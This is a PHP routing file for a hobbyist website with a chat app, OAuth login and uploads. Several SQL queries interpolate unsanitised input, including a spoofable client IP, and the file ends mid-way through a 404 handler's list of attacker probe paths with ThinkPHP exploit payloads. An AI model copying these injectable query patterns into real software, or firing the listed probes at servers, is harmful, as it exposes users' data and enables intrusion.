<?php
/*
   +----------------------------------------------------------------------+
   | Copyright (c) 2020 Trent Wiles and the Riverside Rocks authors       |
   +----------------------------------------------------------------------+
   | This source file is subject to the Apache 2.0 Lisence.               |
   |                                                                      |
   | If you did not receive a copy of the license and are unable to       |
   | obtain it through the world-wide-web, please send a email to         |
   | support@riverside.rocks so we can mail you a copy immediately.       |
   +----------------------------------------------------------------------+
   | Authors: Trent "Riverside Rocks" Wiles <trent@riverside.rocks>       |
   +----------------------------------------------------------------------+
*/

session_start();
header("X-Powered-By: Riverside Rocks");

require __DIR__ . '/vendor/autoload.php';
require 'functions.php';
require 'security.php';

use RiversideRocks\services as Rocks;
use RiversideRocks\security as Secure;



$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

$envRequiredFields = [
    "MYSQL_SERVER", "MYSQL_USERNAME", "MYSQL_PASSWORD", "MYSQL_DATABASE", "YOUTUBE", "ABUSE_IP_DB", "UPLOAD"
];

foreach ($envRequiredFields as $field) {
    if (!isset($_ENV[$field])) {
        die("\$_ENV doesn't have a required field ${field}");
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];

$ip = $_SERVER['REMOTE_ADDR'];
$router = new \Bramus\Router\Router();
$pug = new Pug();

/*===============================================

EMERGENCY SHUTOFF SWITCH

Upon activation, this will disable global access
to the whole website.

If there is ever a crisis, this can be activitated
internally. While this is "visble" in the source
code, the way to activate the kill switch

================================================*/

if(isset($_ENV["w"]))
{
    die(Phug::displayFile('views/kill-switch-result.pug'));
}

/*===============================================

END EMERGENCY SHUTOFF SWITCH

================================================*/

        

$servername = $_ENV['MYSQL_SERVER'];
$username = $_ENV["MYSQL_USERNAME"];
$password = $_ENV["MYSQL_PASSWORD"];
$dbname = $_ENV["MYSQL_DATABASE"];

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT * FROM blocklist WHERE ip='${ip}'";
$result = $conn->query($sql);

$blocks = 0;
if (!empty($result) && $result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        $blocks = $blocks + 1;
        $reason = $row["reason"];
    }
}

if($blocks !== 0)
{
    header("Content-type: application/json");
    header("HTTP/1.1 403 Forbidden");
    $reasons = array(
        "message" => "403 Forbidden",
        "reason" => htmlspecialchars($reason)
    );
    $return = json_encode($reasons, true);
    die($return);
}

$ipinfo = json_decode(file_get_contents("http://ip-api.com/json/${ip}"), true);
$country = $conn -> real_escape_string(htmlspecialchars($ipinfo["country"]));
$epoch = time();

$sql = "INSERT INTO logs (epoch, country) VALUES ('${epoch}', '${country}')";
$result = $conn->query($sql);

$times = 0;

$sql = "SELECT * FROM logs";
    $result = $conn->query($sql);
    $times = 0;
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $times = $times + 1;
        }
    }
    define("times", $times);

$sql = "SELECT * FROM msg";
    $result = $conn->query($sql);
    $times = 0;
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $times = $times + 1;
        }
    }

    define("mess", $times);


    $sql = "SELECT country, count(*) as SameValue from logs GROUP BY country ORDER BY SameValue DESC";
    $result = $conn->query($sql);
    $countries = array();
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $con = htmlspecialchars($row["country"]);
            $val = htmlspecialchars($row["SameValue"]);
            array_push($countries, $con, $val);
        }
    }

$router->get('/api/visits', function() {
    echo json_encode(times, true);
});

$router->get('/api/bycountry', function() {
    print_r($countries);
});

/*===========================
/\/\/\/\/\/\/\/\/\/\/\/\/\/\
END EXPERIMENTAL API ENDPOINTS
/\/\/\/\/\/\/\/\/\/\/\/\/\/\
===========================*/


$router->get('/', function() {
    $pug = new Pug();
    $channel_id = "UCoHNPdbSrE2c_g95JgGiBkw";
    $api_key = $_ENV["YOUTUBE"];
    $api_response = file_get_contents('https://www.googleapis.com/youtube/v3/channels?part=statistics&id='.$channel_id.'&fields=items/statistics/subscriberCount&key='.$api_key);
    $api_response_decoded = json_decode($api_response, true);
    $subs = $api_response_decoded['items'][0]['statistics']['subscriberCount'];
    $api_response2 = file_get_contents('https://www.googleapis.com/youtube/v3/channels?part=statistics&id='.$channel_id.'&fields=items/statistics/viewCount&key='.$api_key);
    $api_response_decoded2 = json_decode($api_response2, true);
    $views = $api_response_decoded2['items'][0]['statistics']['viewCount'];
    $output = $pug->render('views/index.pug', array(
        'visits' => times,
        'subs' => $subs,
        'views' => $views
    ));
    echo $output;
});


$router->get('/about', function() {
    Phug::displayFile('views/about.pug');
});

$router->get('/about/legal', function() {
    Phug::displayFile('views/legal.pug');
});

$router->get('/about/hacking', function() {
    Phug::displayFile('views/hacking.pug');
});

$router->get('/code/production/cred.js', function() {
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $key = $_COOKIE["key"];
    $sql_key = $conn -> real_escape_string(htmlspecialchars($key));
    $sql = "SELECT * FROM logins WHERE temp_auto_api_key='$sql_key'";
    $result = $conn->query($sql);
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $user = $row["username"];
            break;
        }
    }
    echo "const key = Cookies.get('key');\n";
    echo "const channel_send = \"" . $_SESSION["channel"] . "\";\n";
    echo "const username = \"" . $user . "\";\n";
});

$router->get('/code/production/m.js', function() {
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $one_min_ago = time() - 60;
    $messages = array();
    $sql = "SELECT * FROM logins WHERE epoch > ${one_min_ago}";
    $result = $conn->query($sql);
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            array_push($messages, $row["message"]);
        }
    }
    foreach($messages as $_message){
        $rand = Rocks::base64rand(6);
        echo "var ${rand} = \"" . $_message . "\"; \n";
    }
    print_r($messages); // comment this
});

$router->get('/account/login', function() {
    Phug::displayFile('views/signin.pug');
});

$stat = Rocks::statcord("764485265775263784", "logan");

$router->get('/about/stats', function() {
    $pug = new Pug();
    $stat = Rocks::statcord("764485265775263784", "logan");
    $output = $pug->renderFile('views/count.pug', array(
        'bot_users' => $stat[0],
        'bot_servers' => $stat[1],
        'bot_commands' => $stat[2],
        'requests' => times
    ));
    echo $output;
});

$router->get('/projects', function() {
    Phug::displayFile('views/projects.pug');
});

$router->get('/contact', function() {
   header("Location: /about/contact");
});

$router->get('/about/contact', function() {
    Phug::displayFile('views/contact.pug'); // might make this dynamic later, might not
});

$router->post('/about/contact', function() {
   $name = $_POST["name"];
   $email = $_POST["email"];
   $type = $_POST["type"];
   $comment = $_POST["description"];
   // No need to worry about XSS or SQL injections, thats now Discord's problem hehe
   $final = "From ${name} <${email}> regarding ${type}: **${comment}**";
   Rocks::newDiscordContact($final); // Note that this will go to the "hacker feed" on my discord server
    //print_r($_POST);
   Phug::displayFile('views/thanks.pug');
});

$router->get('/watch/(\w+)', function($id) {
    $pug = new Pug();
    $video = json_decode(file_get_contents("https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=${id}&format=json"), true);
    if($video["author_url"] !== "https://www.youtube.com/channel/UCoHNPdbSrE2c_g95JgGiBkw"){
        header("Location: /videos");
        die();
    }
    $vid = "https://www.youtube.com/embed/" . htmlspecialchars($id);
    $title = $video["title"];
    $output = $pug->render('views/video.pug', array(
        'vid' => $vid,
        'title' => htmlspecialchars($title)
    ));
    echo $output;
});

$router->get('/videos', function() {
    $pug = new Pug();
    $ids = array("1", "2", "3");
    $output = $pug->render('views/watch.pug', array(
        'videos' => $ids
    ));
    echo $output;
});

$router->get('/index.php', function() {
    header("Location: https://www.youtube.com/watch?v=E2Q52cVx7Bo");
    die();
});

$router->get('/ip', function() {
    Rocks::abuseDB($ip);
});

$router->get('/discord', function() {
    header("Location: https://discord.gg/Pa7S4Hm");
});

/*================================

     UPLOAD CONTROLLER CODE

===============================*/

$router->get('/admin/upload', function() {
    Phug::displayFile('views/upload.pug');
});

$router->post('/v1/ugc-handler', function() {
    
    $curl = curl_init();

    curl_setopt_array($curl, array(
    CURLOPT_URL => "https://api.imgur.com/3/image",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => array('image' => substr($_POST["img"], 5)),
    CURLOPT_HTTPHEADER => array(
        "Authorization: Client-ID " . $_ENV["IMG_CLIENT"]
    ),
    ));

    $response = json_decode(curl_exec($curl), true);

    curl_close($curl);
    print_r($response);
});

$router->post('/admin/upload', function() {
    $pug = new Pug();
    if($_POST["key"] !== $_ENV["UPLOAD"]){
        $output = $pug->renderFile('views/upload-fail.pug', array(
            'errors' => '400: Bad Request. You are missing a valid upload key.'
        ));
        die($output);
    }
    if($_POST["one"] == "public"){
        $storage = new \Upload\Storage\FileSystem('a');
        $dir = 'a';
    }else{
        $storage = new \Upload\Storage\FileSystem('assets/serve/production/app');
        $dir = 'assets/serve/production/app';
    }
    $file = new \Upload\File('foo', $storage);

    $new_filename = uniqid();
    $file->setName($new_filename);

$data = array(
    'name'       => $file->getNameWithExtension(),
    'extension'  => $file->getExtension(),
    'mime'       => $file->getMimetype(),
    'size'       => $file->getSize(),
    'md5'        => $file->getMd5(),
    'dimensions' => $file->getDimensions()
);

// Try to upload file
try {
    // Success!
    $file->upload();
    $path = "https://riverside.rocks/${dir}/" . $data["name"];
    

    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $epoch = time();
    $sql = "INSERT INTO uploads (`url`, epoch) VALUES ('${path}', '${epoch}')";
    $result = $conn->query($sql);
    if($_GET["api"] == "true")
    {
        echo $path;
        die();
    }
    $output = $pug->renderFile('views/uploaded.pug', array(
        'url' => $path
    ));
    echo $output;
} catch (\Exception $e) {
    // Fail!
    $errors = $file->getErrors();
    if($_GET["api"] == "true")
    {
        echo $errors;
        die();
    }
    $output = $pug->renderFile('views/upload-fail.pug', array(
        'errors' => $errors
    ));
    echo $output;
}
});

$router->get('/v1/web', function() {
    echo "Endpoint deprecated. Redirecting you to /app/";
    header("Location: /app/");
    die();
});

$router->get('/app', function() {
    $pug = new Pug();
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT * FROM msg";
    $result = $conn->query($sql);
    $times = 0;
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $times = $times + 1;
        }
    }
    $timez = $times;
    $sql = "SELECT * FROM logins";
    $result = $conn->query($sql);
    $times = 0;
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $times = $times + 1;
        }
    }

    if(! $_SESSION["username"])
    {
        $output = $pug->render('views/client-v1-preview.pug', array(
            "sent" => $timez,
            "users" => $times
        ));
        echo $output;
    }
    else
    {
        header("Location: /app/channels/general");
        die();
    }
});

$router->get('/app/channels', function() {
    header("Location: /app/channels/general");
    die();
});
//

$router->get('/app/create', function() {
    $pug = new Pug();
    $gen_id = Rocks::base64rand(5);
    $output = $pug->render('views/client-v1-create.pug', array(
        'id' => $gen_id,
        'url_custom' => "https://riverside.rocks/app/channels/" . $gen_id
    ));
    echo $output;
});

$router->get('/app/channels/(\w+)', function($channel) {
    $pug = new Pug();
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $channel_select = $conn -> real_escape_string(htmlspecialchars($channel));
    if(!$channel_select)
    {
        header("Location: /app/channels/general");
        die();
    }
    $_SESSION["channel"] = $channel_select;
    $mess = array();
    $users = array();
    $channel_sql = $conn -> real_escape_string(htmlspecialchars($channel));
    $sql = "SELECT * FROM msg WHERE `channel`='${channel_sql}' ORDER BY `time` DESC";
    $result = $conn->query($sql);
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
                array_push($mess, $row["message"]);
                array_push($users, $row["username"]);
        }
    }
    $output = $pug->renderFile('views/client-v1.pug', array(
        'username' => $_SESSION["username"],
        'id' => $_SESSION["id"],
        'channel' => "#" . $channel_sql,
        'mes1' => $mess[0],
        'user1' => $users[0],
        'mes2' => $mess[1],
        'user2' => $users[1],
        'mes3' => $mess[2],
        'user3' => $users[2],
        'mes4' => $mess[3],
        'user4' => $users[3],
        'debug' => ""
    ));
    echo $output;
});

$router->get('/help/(\w+)', function($wiki) {
    $pug = new Pug();
    if(!isset($wiki))
    {
        die(header("Location: /help/Main_Page"));
    }

    $output = file_get_contents("https://riverside.rocks/w.php?w=${wiki}");
    
    $edit = "https://wiki.riverside.rocks/index.php?title=${wiki}&action=edit";

    $wikipage = $pug->render('views/wiki.pug', array(
        'title' => htmlspecialchars($wiki),
        'content' => $output,
        'edit' => $edit
    ));
    echo $wikipage;
});


$router->get('/v1/new', function() {
    header("Content-type: application/json");
    $options = array(
        'cluster' => 'us2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        $_ENV["PUSHER_APP_KEY"],
        $_ENV["PUSHER_APP_SECRET"],
        $_ENV["PUSHER_APP_ID"],
        $options
    );
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sent_api_key = $conn -> real_escape_string($_GET["key"]);
    $sql = "SELECT * FROM logins WHERE temp_auto_api_key='$sent_api_key'";
    $result = $conn->query($sql);
    $channel_select = $conn -> real_escape_string(htmlspecialchars($_GET["c_id"]));
    if(!$_GET["key"])
    {
        header("HTTP/1.1 401 Unauthorized");
        $json = array(
            "success" => "false",
            "message" => "Missing API key"
        );
        $final = json_encode($json, true);
        die($final);
    }

    if(!$_GET["c_id"])
    {
        header("HTTP/1.1 400 Bad Request");
        $json = array(
            "success" => "false",
            "message" => "Please specifiy a channel"
        );
        $final = json_encode($json, true);
        die($final);
    }

    if(!$_GET["m"])
    {
        header("HTTP/1.1 400 Bad Request");
        $json = array(
            "success" => "false",
            "message" => "Please send a message"
        );
        $final = json_encode($json, true);
        die($final);
    }

    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $_username = $row["username"];
            break;
        }
    }

    if(!isset($_username))
    {
        header("HTTP/1.1 401 Unauthorized");
        $json = array(
            "success" => "false",
            "message" => "Invalid API key"
        );
        $final = json_encode($json, true);
        die($final);
    }

    $sql = "SELECT * FROM admins WHERE username='${_username}'";
    $result = $conn->query($sql);
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            if($row["username"] == $_username)
            {
                $_badge = 'fas fa-shield-alt'; // for the moment we have admin off due to pusher escaping html
            }
        }
    }

    $data['message'] = $_username . " : " . htmlspecialchars($_GET["m"]);
    $pusher->trigger($_GET["c_id"], 'message', $data);

    $data['badge'] = $_badge;
    $pusher->trigger($_GET["c_id"], 'badge', $data);

    $new = $_username;

    $_user = $conn -> real_escape_string(htmlspecialchars($new));
    $_mes = $conn -> real_escape_string(htmlspecialchars($_GET["m"]));
    $_time = $conn -> real_escape_string(htmlspecialchars(time()));
    $_mess_id = $_time . rand() . rand();

    $sent_api_key = $conn -> real_escape_string($data['message']);
    if($_user == "tucker")
    {
        header("HTTP/1.1 400 Bad Request");
        $json = array(
            "success" => "false",
            "message" => "Something went wrong, please contact us trent@riverside.rock is you see this message"
        );
        $final = json_encode($json, true);
        die($final);
    }
    if(strlen($_mes) >= 500)
    {
        $json = array(
            "success" => "false",
            "message" => "Messages cannot be over 500 characters"
        );
        $final = json_encode($json, true);
        die($final);
    }
    if(!isset($_user))
    {
        header("HTTP/1.1 400 Bad Request");
        $json = array(
            "success" => "false",
            "message" => "Something went wrong, please contact us trent@riverside.rock is you see this message"
        );
        $final = json_encode($json, true);
        die($final);
    }

    $runtime = time() - 10;
    $sql = "SELECT * FROM `msg` WHERE username='${_user}' AND `time` > ${runtime}";
    $result = $conn->query($sql);
    $rate = 0;
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $rate = $rate + 1;
        }
    }

    if($rate >= 3)
    {
        header("HTTP/1.1 429 Too Many Requests");
        $json = array(
            "success" => "false",
            "message" => "Woah there! Slow down! You are sending too many messages."
        );
        $final = json_encode($json, true);
        die($final);
    }


    $sql = "INSERT INTO `msg` (`username`, `message`, `time`, `mess_id`, `channel`) VALUES ('${_user}', '${_mes}', '${_time}', '${_mess_id}', '${channel_select}')";
    $result = $conn->query($sql);
    $json = array(
        "success" => "true",
        "message" => "OK"
    );
    $final = json_encode($json, true);
    die($final);
});



$router->get('/community', function() {
    Phug::displayFile('views/community-temp.pug');
});

$router->get('/account/signout', function() {
    session_start();
    session_unset();
    session_destroy();
    header("Location: /");
    die();
});

$router->get('/users/(\w+)', function($id) {
    $pug = new Pug();
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];
    $badge = "";

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $discord = $conn -> real_escape_string($id);
    $sql = "SELECT * FROM admins WHERE username='${discord}'";
    $result = $conn->query($sql);
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            if(isset($row["username"]))
            {
                $badge = 'fas fa-shield-alt';
            }
        }
    }
    $sql = "SELECT * FROM logins WHERE username='${discord}'";
    $result = $conn->query($sql);
    $times = 0;
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $user = htmlspecialchars($row["username"]);
            if($row["username"] == "")
            {
                die(Phug::displayFile('views/user-404.pug'));
            }
            $bio = htmlspecialchars($row["bio"]);
            if(! $bio)
            {
                $bio = "Looks like this user hasn't set a bio!";
            }
            $pre_join = $row["login_time"];
            $join = date("m-d-Y H:i:s", $pre_join);
        }
    }
    $output = $pug->render('views/user.pug', array(
        'username' => $user,
        'bio' => $bio,
        'join' => $join,
        'badge' => $badge
    ));
    echo $output;
});

$router->get('/oauth/github', function() {
    $provider = new League\OAuth2\Client\Provider\Github([
        'clientId'          => $_ENV["GITHUB_CLIENT"],
        'clientSecret'      => $_ENV["GITHUB_SECRET"],
        'redirectUri'       => $_ENV["GITHUB_CALLBACK"],
    ]);
    
    if (!isset($_GET['code'])) {
    
        // If we don't have an authorization code then get one
        $authUrl = $provider->getAuthorizationUrl();
        $_SESSION['oauth2state'] = $provider->getState();
        header('Location: '.$authUrl);
        exit;
    
    // Check given state against previously stored one to mitigate CSRF attack
    } elseif (empty($_GET['state']) || ($_GET['state'] !== $_SESSION['oauth2state'])) {
    
        unset($_SESSION['oauth2state']);
        exit('Invalid state');
    
    } else {
    
        // Try to get an access token (using the authorization code grant)
        $token = $provider->getAccessToken('authorization_code', [
            'code' => $_GET['code']
        ]);
    
        // Optional: Now you have a token you can look up a users profile data
        try {
    
            // We got an access token, let's now get the user's details
            $user = $provider->getResourceOwner($token);
            // Use these details to create a new profile
            $github_username = htmlspecialchars($user->getNickname());
            $github_id = htmlspecialchars($user->getId());
            define("id", $github_id);
            $_SESSION["username"] = $github_username;
            $_SESSION["id"] = $github_id;
            $github_time = time();
            

            /*==========================================
            Insert or Update the Database
            ===========================================*/
            $servername = $_ENV['MYSQL_SERVER'];
            $username = $_ENV["MYSQL_USERNAME"];
            $password = $_ENV["MYSQL_PASSWORD"];
            $dbname = $_ENV["MYSQL_DATABASE"];

            $conn = new mysqli($servername, $username, $password, $dbname);
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            $remote_ip = $conn -> real_escape_string(htmlspecialchars($_SERVER['REMOTE_ADDR']));
            $user_agent = $conn -> real_escape_string(htmlspecialchars($_SERVER['HTTP_USER_AGENT']));
            $show_onboarding = "false";
            echo "Hello ${github_username}, your ID is ${github_id}";
            $sql = "SELECT * FROM logins WHERE username='${github_username}'";
            $result = $conn->query($sql);
            if (!empty($result) && $result->num_rows > 0) {
                while($row = $result->fetch_assoc()) {
                    // Erase old logins
                    if($row["bio"] == "")
                    {
                        $show_onboarding = "true";
                    }
                    $sql = "DELETE FROM logins WHERE username='${github_username}'";
                    $result = $conn->query($sql);
                    break;
                }
            }
            echo "\n DEBUG: SELECTED USERNAME + DELETE OLD RECORD \n";

            $temp_auto_api_key = Rocks::base64rand(30);
            $cookie_name = "key";
            $cookie_value = $temp_auto_api_key;
            setcookie($cookie_name, $cookie_value, time() + (864000 * 30), "/");
            $bio = $row["bio"];
            if(!isset($bio))
            {
                $bio = "Looks like this user has not set a bio yet!";
            }
            $sql = "INSERT INTO `logins`(`IP`, `agent`, `human_agent`, `username`, `id`, `bio`, `login_time`, `temp_auto_api_key`) VALUES ('${remote_ip}', '${user_agent}', 'Not Found', '${github_username}', '${github_id}', '${bio}', '${github_time}', '${temp_auto_api_key}')";
            $result = $conn->query($sql);
            echo "\n DEBUG: INSERT NEW RECORD \n";

            $sql = "SELECT * FROM bans";
            $result = $conn->query($sql);
            if (!empty($result) && $result->num_rows > 0) {
                while($row = $result->fetch_assoc()) {
                    if($row["id"] == id)
                    {
                        $pug = new Pug();
                        $output = $pug->renderFile('views/banned.pug', array(
                            'rule' => htmlspecialchars($row["rule"]),
                            'note' => htmlspecialchars($row["note"]),
                            'type' => htmlspecialchars($row["type"])
                        ));
                        echo $output;
                        session_start();
                        session_unset();
                        session_destroy();
                        die();
                    }
                }
            }

            echo "\n DEBUG: CHECK BAN \n";

            if($show_onboarding == "true"){
                header("Location: /account/welcome");
                die();
            }else{
                header("Location: /account/dashboard");
                
            }


    
        } catch (Exception $e) {
    
            // Failed to get user details
            exit('Oh dear...');
        }
    
        // Use this to interact with an API on the users behalf
        //echo $token->getToken();
    }
});
$router->get('/admin', function() {
    header("Location: /admin/upload/");
    die();
});

$router->get('/account/welcome', function() {
    if(!isset($_SESSION["username"]))
    {
        die(header("Location: /account/dashboard")); // Should prompt user to sign in
    }
    $pug = new Pug();
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT * FROM logins WHERE username='${github_username}'";
    $result = $conn->query($sql);
    if (!empty($result) && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $bio_pre = htmlspecialchars($row["bio"]);
        }
    }
    $output = $pug->renderFile('views/account-details.pug', array(
        'username' => $_SESSION["username"],
        'current_bio' => $bio_pre,
    ));
    echo $output;
});

$router->post('/account/welcome', function() {
    if(!isset($_POST["bio"]))
    {
        header("Location: /account/dashboard");
        die();
    }
    $servername = $_ENV['MYSQL_SERVER'];
    $username = $_ENV["MYSQL_USERNAME"];
    $password = $_ENV["MYSQL_PASSWORD"];
    $dbname = $_ENV["MYSQL_DATABASE"];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $updated_bio = $conn -> real_escape_string(htmlspecialchars($_POST["bio"]));
    $auth_u = $_SESSION["username"];
    $sql = "UPDATE `logins` SET `bio`='${updated_bio}' WHERE username='$auth_u'";
    $result = $conn->query($sql);
    header("Location: /account/dashboard");
    die();
});



$router->get('/account/dashboard', function() {
    $pug = new Pug();
    if(!isset($_SESSION["username"]))
    {
       die(header("Location: /account/login/"));
    }
    $output = $pug->renderFile('views/dashboard.pug', array(
        'username' => $_SESSION["username"],
        'icon' => "https://avatars0.githubusercontent.com/u/" . $_SESSION["id"],
        'url' => "/users" . "/" . $_SESSION["username"]
    ));
    echo $output;
    // Note to self, work on this!
    // As of 11/13 this endpoint is pretty bare it could use quite a bit of work (~riversiderocks)
});

$router->set404(function() {
    header('HTTP/1.1 404 Not Found');
    echo "Under header <br>";
    $exploits = array(
        "/.env" => "Tried to access .env file",
        "/api/jsonws/invoke" => "Tried to POST web API, /api/jsonws/invoke",
        "/.git//index" => "Attempted to access git files, /.git//index",
        "/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" => "ThinkPHP exploit. /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>",
        "/?XDEBUG_SESSION_START=phpstorm" => "PHPSTORM Debug hack",
        "/solr/admin/info/system?wt=json" => "Trying to access solr admin page.",
        "/boaform/admin/formLogin" => "Trying to access admin login: /boaform/admin/formLogin",
        "/config/getuser?index=0" => "Trying to access configuration files: /config/getuser?index=0",
        "/test/.env" => "Attempting to access .env file",
        "/laravel/.env" => "Attempting to access .env file",
        "/admin/.env" => "Attempting to access .env file",
        "/system/.env" => "Attempting to access .env file",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" => "Attempting to access vendor files: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/por/login_psw.csp" => "Trying to access admin login pages: /por/login_psw.csp",
        "/ui/login.php" => "Trying to access admin login pages: /ui/login.php",
        "/cgi-bin/login.cgi?requestname=2&cmd=0" => "Trying to access admin login pages: /cgi-bin/login.cgi?requestname=2&cmd=0",
        "/GponForm/diag_Form?images/" => "Odd Request, trying to access some sort of form: /GponForm/diag_Form?images/",
        "//vendor/phpunit/phpunit/phpunit.xsd" => "Trying to access PHPUnit scripts: //vendor/phpunit/phpunit/phpunit.xsd",
        "//web/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
        "//wordpress/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
        "//wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
        "//shop/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
        "//cms/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
        "//xmlrpc.php?rsd" => "Suspicous request; //xmlrpc.php?rsd",
        "/manager/text/list" => "Trying to access admin files: /manager/text/list",
        "/boaform/admin/formLogin?username=ec8&psd=ec8" => "Trying to access admin login: /boaform/admin/formLogin",
        "/phpMyAdmin/scripts/setup.php" => "Trying to access phpMyAdmin page.",
        "/TP/public/index.php" => "Tried ThinkPHP Exploit",
        "/phpmyadmin/" => "Tried to access phpMyAdmin page",
        "/clientaccesspolicy.xml" => "Bad web bot, ignores robots.txt",
        "/connector.sds" => "Scanning for vulns, GET /connector.sds",
        "/hudson" => "Scanning for vulns, GET /hudson",
        "/wp-includes/js/jquery/jquery.js" => "Searching for vulns, GET /wp-includes/js/jquery/jquery.js",
        "/webfig/" => "GET /webfig/",
        "/editBlackAndWhiteList" => "GET /editBlackAndWhiteList",
        "/boaform/admin/formLogin?username=adminisp&psd=adminisp" => "Searching for login pages",
        "/wp-admin" => "Looking for wordpress exploits",
        "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP" => "ThinkPHP exploit",
        "/wp-content/plugins/wp-file-manager/readme.txt" => "Searching for Wordpress file manager",
        "/wp/wp-admin/" => "Looking for wordpress admin",
        "/wp-admin/" => "Looking for wordpress admin",
        "/html/public/index.php" => "Looking for framework vulnurabilities",
        "/ab2h" => "Scanning",
        "/solr/" => "Searching for login pages",
        "//sito/wp-includes/wlwmanifest.xml" => "Searching for wordpress files",
        "/PHPMYADMIN/scripts/setup.php" => "phpMyAdmin exploits",
        "/wp-login.php" => "Trying to access wordpress admin page",
        "/wp-config.php" => "Trying to access wordpress files",
        "/ctrlt/DeviceUpgrade_1" => "Router exploit",
        "/nice%20ports%2C/Tri%6Eity.txt%2ebak" => "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak",
        "/wls-wsat/CoordinatorPortType11" => "Oracle WebLogic server Remote Code Execution vulnerability.",
        "/_async/AsyncResponseService" => "Oracle WebLogic server Remote Code Execution vulnerability.",
        "/webmail/VERSION" => "GET /webmail/VERSION",
        "/mail/VERSION" => "GET /mail/VERSION",
